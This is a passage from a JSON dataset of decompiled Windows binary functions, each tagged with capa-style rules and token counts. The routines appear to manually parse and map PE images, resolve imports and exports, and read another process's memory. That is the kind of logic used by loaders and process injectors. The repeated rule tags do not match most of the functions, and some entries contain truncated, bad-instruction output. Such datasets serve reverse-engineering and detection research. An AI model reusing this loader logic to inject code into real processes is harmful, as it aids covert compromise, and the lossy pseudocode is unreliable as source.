        "decompiled_code": "\nint32_t __cdecl fcn.0005afa0(code **arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x17) == 0) ||\n       ((iVar1 = fcn.00059020(*(arg_8h + 0x17), 0xb1be273c, arg_8h + 0xf),  iVar1 == 0 &&\n        (((*(arg_8h + 99) == 0 || (*(arg_8h + 0x6f) != 0)) ||\n         (iVar1 = fcn.0005cb50(*(arg_8h + 0x17), *(arg_8h + 0xf), 0xb1be2764, arg_8h + 0x9f),  iVar1 == 0)))))) {\n        if (*(arg_8h + 0x17) == 0) {\n            if (*(arg_8h + 99) == 0) {\n                iVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f));\n            }\n            else {\n                iVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f), 0);\n                iVar1 = (iVar1 != 0) - 1;\n            }\n        }\n        else {\n            iVar1 = fcn.0005b090(arg_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 350
    },
    "0005b090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005b090(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    char var_dh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_18h = fcn.0005a2c0(&var_14h, 0x47a, *(arg_8h + 0x17));\n    if ((var_18h == 0) && (var_18h = fcn.0005a030(var_14h, &var_dh),  var_18h == 0)) {\n        *(arg_8h + 0xc) = var_dh;\n        *(arg_8h + 0x1b) = var_14h;\n        *(arg_8h + 0x1f) = 0;\n        *(arg_8h + 0x2b) = 1;\n        if (var_dh == '\\0') {\n            var_18h = 0x21590064;\n        }\n        else {\n            var_4h = 0xb1c57a98;\n            var_8h = 0x24c;\n            var_18h = fcn.0005a1b0(var_14h, &var_ch, &var_8h);\n            if ((var_18h == 0) && (var_18h = fcn.0005a170(var_14h, var_ch, 0, var_4h, 0xfe),  var_18h == 0)) {\n                *(arg_8h + 0x23) = var_ch;\n                *(arg_8h + 0x27) = 0;\n                var_18h = fcn.0005ade0(arg_8h);\n                if ((var_18h == 0) &&\n                   (var_18h = fcn.0005a170(var_14h, var_ch + 0x1a5, (0xffffff01 < var_ch) + (0xffffff58 < var_ch + 0xfe)\n                                           , arg_8h, 0xa7),  var_18h == 0)) {\n                    *(arg_8h + 0x33) = var_ch + 0x1a5;\n                    *(arg_8h + 0x37) = 0;\n                    var_18h = fcn.0005ae50(arg_8h);\n                }\n            }\n        }\n    }\n    if ((var_ch != 0) && (*(arg_8h + 0x2b) != 0)) {\n        var_8h = 0;\n        fcn.00078730(var_14h, &var_ch, &var_8h, 0x8000);\n    }\n    fcn.00078544(var_14h);\n    return var_18h;\n}\n",
        "token_count": 658
    },
    "0005b270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005b390\n\nuint __cdecl fcn.0005b270(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    iVar3 = arg_8h + *(arg_8h + 0x3c);\n    if (*(iVar3 + 0x18) == 0x10b) {\n        var_24h = *(iVar3 + 0xa0);\n        iVar1 = *(iVar3 + 0x34);\n        var_ch = *(iVar3 + 0x70);\n    }\n    else {\n        var_24h = *(iVar3 + 0xb0);\n        iVar1 = *(iVar3 + 0x30);\n        var_ch = *(iVar3 + 0x80);\n    }\n    if (arg_ch == iVar1) {\n        uVar2 = 0;\n    }\n    else if (var_24h == 0) {\n        if ((var_ch & 1) == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        for (; var_2ch = arg_8h + var_24h,  *(var_2ch + 4) != 0; var_24h = var_24h + *(var_2ch + 4)) {\n            if ((*(var_2ch + 4) - 8U >> 1 & 0xffff) != 0) {\n                if (10 < *(var_24h + 8 + arg_8h) >> 0xc) {\n                    return 0x21590064;\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 518
    },
    "0005b480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n\nint32_t __cdecl fcn.0005b480(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t arg_14h;\n    int32_t iVar3;\n    int32_t arg_14h_00;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    uint32_t *var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_20h = 0;\n    var_2ch = 0;\n    var_4h = 0;\n    var_28h = 0;\n    arg_14h = fcn.00035200(0x148);\n    if (arg_14h == 0) {\n        var_34h = 0x21590004;\n    }\n    else {\n        arg_14h_00 = arg_14h + 0x40;\n        var_34h = fcn.0005a2c0(&var_2ch, 0x10, arg_8h);\n        if (var_34h == 0) {\n            var_18h = arg_ch + arg_ch[0xf];\n            if (*(var_18h + 0x18) == 0x10b) {\n                var_14h = var_18h;\n            }\n            if (*(var_18h + 0x18) != 0x10b) {\n                return 0x21590001;\n            }\n            if (var_14h == 0) {\n                iVar3 = *(var_18h + 0x80);\n                var_48h = 0;\n            }\n            else {\n                iVar3 = *(var_18h + 0x80);\n                var_48h = 0x80000000;\n            }\n            var_ch = arg_ch + iVar3;\n            if (var_ch == arg_ch) {\n                var_34h = 0;\n            }\n            else {\n                for (; var_ch[3] != 0; var_ch = var_ch + 5) {\n                    iVar3 = fcn.0001d7c0(&var_28h, var_4h << 2, var_4h * 4 + 4);\n                    if (iVar3 != 0) {\n                        var_34h = 0x21590004;\n                        goto code_r0x0005b831;\n                    }\n                    if (arg_8h == 0) {\n                        var_34h = fcn.00034a80(arg_ch + var_ch[3], var_28h + var_4h * 4);\n                    }\n                    else {\n                        var_34h = fcn.0005d250(arg_8h, arg_ch + var_ch[3], var_28h + var_4h * 4);\n                    }\n                    if (var_34h != 0) goto code_r0x0005b831;\n                    var_4h = var_4h + 1;\n                    var_34h = fcn.0005a130(var_2ch, *(var_28h + -4 + var_4h * 4), 0, arg_14h, 0x40);\n                    if (var_34h != 0) goto code_r0x0005b831;\n                    uVar1 = *(var_28h + -4 + var_4h * 4);\n                    uVar2 = *(arg_14h + 0x3c);\n                    var_34h = fcn.0005a130(var_2ch, uVar1 + uVar2, (uVar2 >> 0x1f) + CARRY4(uVar1, uVar2), arg_14h_00, \n                                           0xf8);\n                    if (var_34h != 0) goto code_r0x0005b831;\n                    if (*(arg_14h + 0x58) != 0x10b) {\n                        uVar1 = *(var_28h + -4 + var_4h * 4);\n                        uVar2 = *(arg_14h + 0x3c);\n                        var_34h = fcn.0005a130(var_2ch, uVar1 + uVar2, (uVar2 >> 0x1f) + CARRY4(uVar1, uVar2), \n                                               arg_14h_00, 0x108);\n                        if (var_34h != 0) goto code_r0x0005b831;\n                    }\n                    var_38h = arg_ch + var_ch[4];\n                    if (*var_ch == 0) {\n                        iVar3 = var_ch[4];\n                    }\n                    else {\n                        iVar3 = *var_ch;\n                    }\n                    var_8h = arg_ch + iVar3;\n                    if (var_14h == 0) {\n                        var_24h = *var_8h;\n                    }\n                    else {\n                        var_24h = *var_8h;\n                    }\n                    while (var_24h != 0) {\n                        if ((var_24h & var_48h) == 0) {\n                            var_10h = arg_ch + var_24h + 2;\n                        }\n                        else {\n                            var_10h = var_24h & 0xffff;\n                        }\n                        if (arg_8h == 0) {\n                            var_34h = fcn.0005c850(*(var_28h + -4 + var_4h * 4), var_10h, &var_20h);\n                        }\n                        else {\n                            var_34h = fcn.0005bc00(var_2ch, arg_14h_00, *(var_28h + -4 + var_4h * 4), arg_8h, \n                                                   *(var_28h + -4 + var_4h * 4), var_2ch, &var_20h, &var_1ch);\n                        }\n                        if (var_34h != 0) goto code_r0x0005b831;\n                        if (var_14h == 0) {\n                            *var_38h = var_20h;\n                            var_24h = var_8h[1];\n                        }\n                        else {\n                            *var_38h = var_20h;\n                            var_24h = var_8h[1];\n                        }\n                        var_8h = var_8h + 1;\n                        var_38h = var_38h + 1;\n                    }\n                }\n                var_34h = 0;\n            }\n        }\ncode_r0x0005b831:\n        fcn.0005a340(var_2ch);\n        if (((var_34h != 0) && (var_28h != 0)) && (arg_8h != 0)) {\n            for (; var_4h != 0; var_4h = var_4h + -1) {\n                fcn.0005d930(arg_8h, *(var_28h + -4 + var_4h * 4), 1);\n            }\n        }\n        fcn.00035330(var_28h);\n        fcn.00035330(arg_14h);\n    }\n    return var_34h;\n}\n",
        "token_count": 1798
    },
    "0005b980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005b980(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = arg_ch + *(arg_ch + 0x3c);\n    if (*(iVar2 + 0x18) == 0x10b) {\n        var_ch = *(iVar2 + 0x38);\n        var_14h = *(iVar2 + 0x54);\n    }\n    else {\n        var_ch = *(iVar2 + 0x38);\n        var_14h = *(iVar2 + 0x54);\n    }\n    fcn.00034e80(arg_8h, arg_ch, var_14h);\n    var_8h = iVar2 + 0x18 + *(iVar2 + 0x14);\n    for (var_4h = 0; var_4h < *(iVar2 + 6); var_4h = var_4h + 1) {\n        if (*(var_8h + 0x10) != 0) {\n            iVar1 = fcn.0005b230(*(var_8h + 0xc), var_ch);\n            fcn.00034e80(arg_8h + iVar1, arg_ch + *(var_8h + 0x14), *(var_8h + 0x10));\n        }\n        var_8h = var_8h + 0x28;\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "0005ba60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0005ba60(int32_t arg_8h, uint arg_ch, uint32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h + *(arg_8h + 0x3c);\n    if (*(iVar3 + 0x18) == 0x10b) {\n        var_10h = *(iVar3 + 0x38);\n        var_18h = *(iVar3 + 0x54);\n    }\n    else {\n        var_10h = *(iVar3 + 0x38);\n        var_18h = *(iVar3 + 0x54);\n    }\n    var_18h = fcn.0005b230(var_18h, var_10h);\n    var_8h = iVar3 + 0x18 + *(iVar3 + 0x14);\n    var_4h = 0;\n    while( true ) {\n        if (*(iVar3 + 6) <= var_4h) {\n            return 0x21590005;\n        }\n        iVar1 = fcn.00078706(var_8h, arg_ch, 8);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.0005b230(*(var_8h + 8), var_10h);\n        var_18h = iVar1 + var_18h;\n        var_8h = var_8h + 0x28;\n        var_4h = var_4h + 1;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = var_4h;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = var_8h;\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = arg_8h + var_18h;\n    }\n    if (arg_1ch != NULL) {\n        uVar2 = fcn.0005b230(*(var_8h + 8), var_10h);\n        *arg_1ch = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 559
    },
    "0005bb80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005bb80(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch != 0) && (arg_ch < 0x40)) {\n        return 0x21590065;\n    }\n    if (*arg_8h == 0x5a4d) {\n        if ((arg_ch != 0) && (arg_ch < *(arg_8h + 0x1e) + 0xf8U)) {\n            return 0x21590065;\n        }\n        if (*(arg_8h + *(arg_8h + 0x1e)) == 0x4550) {\n            return 0;\n        }\n    }\n    return 0x21590065;\n}\n",
        "token_count": 182
    },
    "0005bc00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0005bc00(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint noname_4, int32_t *arg_1ch, \n            int32_t *arg_20h, uint32_t *arg_24h)\n\n{\n    uint8_t uVar1;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t *var_90h;\n    int32_t *var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    uint var_78h;\n    int32_t *var_74h;\n    uint var_70h;\n    uint var_68h;\n    int32_t *var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = NULL;\n    if ((((arg_20h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_24h == NULL)) {\n        var_58h = 0x21590008;\n    }\n    else {\n        *arg_24h = arg_10h;\n        if (*(arg_ch + 0x18) == 0x10b) {\n            var_54h = arg_ch + 0x78;\n        }\n        else {\n            var_54h = arg_ch + 0x88;\n        }\n        if (*var_54h == 0) {\n            var_58h = 0x21590005;\n        }\n        else {\n            var_4ch = *var_54h + var_54h[1];\n            var_4h = arg_10h + *var_54h;\n            var_58h = fcn.0005a130(arg_8h, var_4h, 0, &var_30h, 0x28);\n            if (var_58h == 0) {\n                var_44h = arg_10h + var_14h;\n                var_50h = arg_10h + var_ch;\n                var_40h = arg_10h + var_10h;\n                var_34h = fcn.00035200(0x104);\n                if (var_34h == NULL) {\n                    var_58h = 0x21590004;\n                }\n                else if ((arg_1ch & 0xffff0000) == 0) {\n                    var_5ch._0_2_ = arg_1ch - var_20h;\n                    if (var_1ch < var_5ch) {\n                        var_58h = 0x21590005;\n                    }\n                    else {\n                        var_58h = fcn.0005a130(arg_8h, var_44h + var_5ch * 4, 0, &var_48h, 4);\n                        if (var_58h == 0) {\n                            if ((var_48h < *var_54h) || (*var_54h + var_54h[1] <= var_48h)) {\n                                *arg_20h = arg_10h + var_48h;\n                                var_58h = 0;\n                            }\n                            else {\n                                if (var_4ch - var_48h < 0x105) {\n                                    var_60h = var_4ch - var_48h;\n                                }\n                                else {\n                                    var_60h = 0x104;\n                                }\n                                var_58h = fcn.0005a130(arg_8h, arg_10h + var_48h, CARRY4(arg_10h, var_48h), var_34h, \n                                                       var_60h);\n                                if (var_58h == 0) {\n                                    var_58h = fcn.0005c1a0(arg_14h, arg_10h, var_34h, arg_20h, arg_24h);\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_64h = arg_1ch;\n                    do {\n                        uVar1 = *var_64h;\n                        var_64h = var_64h + 1;\n                    } while (uVar1 != 0);\n                    if (var_64h - (arg_1ch + 1) < 0x103) {\n                        var_74h = arg_1ch;\n                        do {\n                            uVar1 = *var_74h;\n                            var_74h = var_74h + 1;\n                        } while (uVar1 != 0);\n                        var_84h = var_74h - (arg_1ch + 1);\n                    }\n                    else {\n                        var_84h = 0x103;\n                    }\n                    var_8h = var_84h;\n                    var_58h = -1;\n                    for (var_3ch = 0; var_3ch < var_18h; var_3ch = var_3ch + 1) {\n                        var_58h = fcn.0005a130(arg_8h, var_50h + var_3ch * 2, 0, &var_5ch, 2);\n                        if (((var_58h != 0) ||\n                            (var_58h = fcn.0005a130(arg_8h, var_44h + var_5ch * 4, 0, &var_48h, 4),  var_58h != 0)) ||\n                           (var_58h = fcn.0005a130(arg_8h, var_40h + var_3ch * 4, 0, &var_38h, 4),  var_58h != 0))\n                        goto code_r0x0005c17c;\n                        if (var_8h < var_4ch - var_38h) {\n                            var_58h = fcn.0005a130(arg_8h, arg_10h + var_38h, CARRY4(arg_10h, var_38h), var_34h, \n                                                   var_8h + 1);\n                            if (var_58h != 0) goto code_r0x0005c17c;\n                            if (*(var_34h + var_8h) == 0) {\n                                var_8ch = arg_1ch;\n                                var_90h = var_34h;\n                                for (var_88h = var_8h; 3 < var_88h; var_88h = var_88h - 4) {\n                                    if (*var_90h != *var_8ch) goto code_r0x0005bfaf;\n                                    var_8ch = var_8ch + 1;\n                                    var_90h = var_90h + 1;\n                                }\n                                if (var_88h == 0) {\ncode_r0x0005c085:\n                                    var_98h = 0;\n                                }\n                                else {\ncode_r0x0005bfaf:\n                                    var_94h = *var_90h - *var_8ch;\n                                    if (var_94h == 0) {\n                                        if (var_88h == 1) goto code_r0x0005c085;\n                                        var_94h = *(var_90h + 1) - *(var_8ch + 1);\n                                        if (var_94h == 0) {\n                                            if (var_88h == 2) goto code_r0x0005c085;\n                                            var_94h = *(var_90h + 2) - *(var_8ch + 2);\n                                            if (var_94h == 0) {\n                                                if ((var_88h == 3) ||\n                                                   (var_94h = *(var_90h + 3) - *(var_8ch + 3),  var_94h == 0))\n                                                goto code_r0x0005c085;\n                                            }\n                                        }\n                                    }\n                                    var_98h = 1;\n                                    if (var_94h < 1) {\n                                        var_98h = -1;\n                                    }\n                                }\n                                if (var_98h == 0) {\n                                    if ((var_48h < *var_54h) || (*var_54h + var_54h[1] <= var_48h)) {\n                                        *arg_20h = arg_10h + var_48h;\n                                        var_58h = 0;\n                                    }\n                                    else {\n                                        if (var_4ch - var_48h < 0x105) {\n                                            var_a0h = var_4ch - var_48h;\n                                        }\n                                        else {\n                                            var_a0h = 0x104;\n                                        }\n                                        var_58h = fcn.0005a130(arg_8h, arg_10h + var_48h, CARRY4(arg_10h, var_48h), \n                                                               var_34h, var_a0h);\n                                        if (var_58h != 0) goto code_r0x0005c17c;\n                                        var_58h = fcn.0005c1a0(arg_14h, arg_10h, var_34h, arg_20h, arg_24h);\n                                    }\n                                    break;\n                                }\n                            }\n                        }\n                    }\n                    if (var_18h <= var_3ch) {\n                        var_58h = 0x21590005;\n                    }\n                }\n            }\ncode_r0x0005c17c:\n            fcn.00035330(var_34h);\n        }\n    }\n    return var_58h;\n}\n",
        "token_count": 2327
    },
    "0005c1a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.0005c1a0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    var_10h = 0;\n    var_ch = fcn.00078658(arg_10h, 0x2e);\n    if (var_ch == NULL) {\n        var_14h = 0x2159000d;\n    }\n    else {\n        *var_ch = 0;\n        var_ch = var_ch + 1;\n        var_10h = fcn.00035200(0x20a);\n        if (var_10h == 0) {\n            var_14h = 0x21590004;\n        }\n        else {\n            var_4h = 0;\n            while (var_8h = fcn.0007871e(var_10h, arg_10h, 0x104),  var_8h != -1) {\n                *(var_10h + var_8h * 2) = 0;\n                var_14h = fcn.0005df60(arg_8h, var_10h, 0x20a, &var_4h);\n                if (((var_14h != 0) || (var_14h = fcn.0005d300(arg_8h, var_10h, &var_18h),  var_14h != 0)) ||\n                   ((var_18h != arg_ch && (var_14h = fcn.0005c300(arg_8h, var_18h, var_ch, arg_14h),  var_14h == 0))))\n                goto code_r0x0005c2d1;\n                arg_ch_00 = var_18h;\n                if (var_4h == -1) {\n                    var_14h = 0x2159000d;\n                    goto code_r0x0005c2d1;\n                }\n                var_18h = arg_8h;\n                fcn.0005d930(arg_8h, arg_ch_00, 1);\n            }\n            var_14h = 0x21590066;\ncode_r0x0005c2d1:\n            fcn.00035330(var_10h);\n            if (var_14h == 0) {\n                *arg_18h = var_18h;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 670
    },
    "0005c300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005c300(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_250h;\n    uint32_t var_214h;\n    int32_t var_210h;\n    uint var_20ch;\n    uint *var_208h;\n    uint var_204h;\n    int32_t var_200h;\n    uint var_1e8h;\n    uint var_108h;\n    \n    var_20ch = 0;\n    var_208h = &var_200h;\n    var_210h = fcn.0005a2c0(&var_20ch, 0x18, arg_8h);\n    if ((var_210h == 0) && (var_210h = fcn.0005a130(var_20ch, arg_ch, 0, &var_250h, 0x40),  var_210h == 0)) {\n        if (var_250h == 0x5a4d) {\n            var_210h = fcn.0005a130(var_20ch, arg_ch + var_214h, (var_214h >> 0x1f) + CARRY4(arg_ch, var_214h), \n                                    &var_200h, 0xf8);\n            if (var_210h == 0) {\n                if (var_200h == 0x4550) {\n                    if (var_1e8h != 0x10b) {\n                        var_210h = fcn.0005a130(var_20ch, arg_ch + var_214h, \n                                                (var_214h >> 0x1f) + CARRY4(arg_ch, var_214h), &var_108h, 0x108);\n                        if (var_210h != 0) goto code_r0x0005c476;\n                        var_208h = &var_108h;\n                    }\n                    var_210h = fcn.0005bc00(var_20ch, var_208h, arg_ch, arg_8h, arg_ch, arg_10h, arg_14h, &var_204h);\n                }\n                else {\n                    var_210h = -1;\n                }\n            }\n        }\n        else {\n            var_210h = -1;\n        }\n    }\ncode_r0x0005c476:\n    fcn.0005a340(var_20ch);\n    return var_210h;\n}\n",
        "token_count": 568
    },
    "0005c490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005c490(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00035200(0x20a);\n    if (arg_ch_00 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        iVar1 = fcn.0007871e(arg_ch_00, arg_ch, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n        }\n        else {\n            *(arg_ch_00 + iVar1 * 2) = 0;\n            var_4h = fcn.0005c520(arg_8h, arg_ch_00, arg_10h, arg_14h, arg_18h);\n        }\n        fcn.00035330(arg_ch_00);\n    }\n    return var_4h;\n}\n",
        "token_count": 255
    },
    "0005c520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005c520(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    char var_19h;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 0xffffffff;\n    var_4h = NULL;\n    var_14h = 0;\n    var_10h = 0;\n    *arg_14h = 0;\n    var_8h = fcn.00035960(arg_ch, 0x8000);\n    if (var_8h == -1) {\n        var_4h = fcn.00035200(0x208);\n        if (var_4h == NULL) {\n            return 0x21590004;\n        }\n        var_18h = fcn.00034b10(var_4h, 0x104);\n        if (var_18h != 0) goto code_r0x0005c7ee;\n        if (arg_8h == 0) {\n            var_19h = '\\0';\n        }\n        else {\n            var_18h = fcn.0005a2c0(&var_14h, 0x400, arg_8h);\n            if ((var_18h != 0) || (var_18h = fcn.00059fe0(0xffffffff, &var_19h),  var_18h != 0)) goto code_r0x0005c7ee;\n        }\n        if (var_19h == '\\0') {\n            var_20h = var_4h;\n            do {\n                iVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (iVar1 != 0);\n            fcn.000785e6(var_4h, 0xb1be277c, 0x104 - (var_20h - (var_4h + 1) >> 1));\n        }\n        else {\n            var_30h = var_4h;\n            do {\n                iVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (iVar1 != 0);\n            fcn.000785e6(var_4h, 0xb1be2794, 0x104 - (var_30h - (var_4h + 1) >> 1));\n        }\n        var_40h = var_4h;\n        do {\n            iVar1 = *var_40h;\n            var_40h = var_40h + 1;\n        } while (iVar1 != 0);\n        fcn.000785e6(var_4h, arg_ch, 0x104 - (var_40h - (var_4h + 1) >> 1));\n        var_4h[0x103] = 0;\n        var_8h = fcn.00035960(var_4h, 0);\n        if (var_8h == -1) {\n            var_18h = 0x21590005;\n            goto code_r0x0005c7ee;\n        }\n    }\n    var_ch = fcn.00035930(var_8h);\n    if (var_ch == -1) {\n        var_18h = -1;\n    }\n    else {\n        var_10h = fcn.00035200(var_ch);\n        if (var_10h == 0) {\n            var_18h = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00035b50(var_8h, var_10h, var_ch);\n            if (iVar2 == -1) {\n                var_18h = -1;\n            }\n            else {\n                var_ch = fcn.0005b8a0(var_10h);\n                iVar2 = fcn.00035200(var_ch);\n                *arg_14h = iVar2;\n                if (*arg_14h == 0) {\n                    var_18h = 0x21590004;\n                }\n                else {\n                    var_18h = fcn.0005b980(*arg_14h, var_10h);\n                    if (var_18h == 0) {\n                        if (arg_10h == 0) {\n                            var_50h = *arg_14h;\n                        }\n                        else {\n                            var_50h = arg_10h;\n                        }\n                        var_18h = fcn.0005b270(*arg_14h, var_50h);\n                        if ((var_18h == 0) && (arg_18h != NULL)) {\n                            *arg_18h = var_ch;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0005c7ee:\n    if (var_18h != 0) {\n        fcn.00035330(*arg_14h);\n        *arg_14h = 0;\n    }\n    